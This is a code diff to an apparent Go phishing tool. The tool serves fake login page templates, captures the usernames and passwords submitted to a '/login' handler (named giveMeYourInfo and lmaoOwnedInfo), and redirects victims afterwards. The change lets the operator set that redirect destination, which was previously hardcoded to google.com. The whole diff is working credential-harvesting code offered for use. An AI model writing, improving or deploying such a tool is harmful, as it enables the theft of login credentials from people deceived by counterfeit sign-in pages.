@@ -38,6 +38,7 @@ type Login struct {
 
 type ChoiceHandler struct {
 	Choice string
+	Redir  string
 }
 
 func menu() {
@@ -74,6 +75,8 @@ func menu() {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("[*] Choose an option: ")
 	choice, _ := reader.ReadString('\n')
+	fmt.Print("[*] Choose redirect URL (Default is google.com): ")
+	redir, _ := reader.ReadString('\n')
 	fmt.Print("[*] Enter IP and port to listen on (Default is 127.0.0.1:8080): ")
 	listenip, _ := reader.ReadString('\n')
 
@@ -81,8 +84,9 @@ func menu() {
 		listenip = "127.0.0.1:8080"
 	}
 	listenip = strings.TrimSpace(listenip)
+	redir = strings.TrimSpace(redir)
 	bloatedChoiceHandler(choice)
-	loadTheWebMan(choice, listenip)
+	loadTheWebMan(choice, listenip, redir)
 }
 
 func bloatedChoiceHandler(choice string) string {
@@ -126,8 +130,8 @@ func bloatedChoiceHandler(choice string) string {
 	return returns
 }
 
-func loadTheWebMan(choice, listenip string) {
-	choiceHandler := &ChoiceHandler{Choice: choice}
+func loadTheWebMan(choice, listenip, redir string) {
+	choiceHandler := &ChoiceHandler{Choice: choice, Redir: redir}
 	http.HandleFunc("/login", choiceHandler.giveMeYourInfo)
 	http.HandleFunc("/", choiceHandler.epicTemplateLoader)
 	fmt.Println("[*] HTTP listener started on " + listenip)
@@ -155,7 +159,6 @@ func (p *Login) lmaoOwnedInfo(choice string) error {
 
 func (ch *ChoiceHandler) epicTemplateLoader(w http.ResponseWriter, r *http.Request) {
 	theChoice := bloatedChoiceHandler(ch.Choice)
-	//p := &Login{Username: "", Password: ""}
 	p := &Login{}
 	t, _ := template.ParseFiles("templates/" + theChoice + "/login.html")
 	t.Execute(w, p)
@@ -172,5 +175,5 @@ func (ch *ChoiceHandler) giveMeYourInfo(w http.ResponseWriter, r *http.Request) 
 	}
 	theChoice := bloatedChoiceHandler(ch.Choice)
 	p.lmaoOwnedInfo(theChoice)
-	http.Redirect(w, r, "//google.com", http.StatusFound)
+	http.Redirect(w, r, "//"+ch.Redir, http.StatusFound)
 }
